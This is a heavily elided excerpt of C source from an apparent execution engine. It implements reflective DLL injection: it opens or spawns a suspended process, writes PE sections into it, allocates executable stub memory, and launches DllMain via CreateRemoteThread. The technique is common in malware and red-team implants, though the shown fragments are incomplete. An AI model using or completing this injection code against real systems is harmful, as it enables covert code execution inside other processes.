/* ============================================================================
 * Proteus- Execution Engine -- reflective_dll.c
...
static BOOL ExecuteRemoteDll(HANDLE hProcess, LPVOID remoteBase, DWORD entryRVA) {
    ...
    LOG_INFO("[+] Remote DllMain address: %p", pDllMain);

    size_t totalSize = 4096;
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, totalSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        LOG_INFO("[-] VirtualAllocEx for stub failed: %lu", GetLastError());
        return FALSE;
    }
    ...
    *(DWORD*)(stub + 14) = (DWORD)pDllMain;
    ...
    if (!hThread) {
        LOG_INFO("[-] CreateRemoteThread for stub failed: %lu", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return FALSE;
    }
...
int perform_reflective_injection(InjectionConfig* config) {
    ...
    if (pid == 0) {
        ...
        LOG_INFO("[+] Created suspended process PID: %lu", pid);
    } else {
        ...
        LOG_INFO("[+] Opened process PID: %lu", pid);
    }
    ...
    if (!remoteBase) {
        ...
        LOG_INFO("[+] Allocated at fallback: %p", remoteBase);
    } else {
        LOG_INFO("[+] Allocated at preferred base: %p", remoteBase);
    }
    ...
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        ...
        if (pSection[i].SizeOfRawData > 0) {
            ...
            LOG_INFO("[+] Section [%s] written", pSection[i].Name);
        }
    }
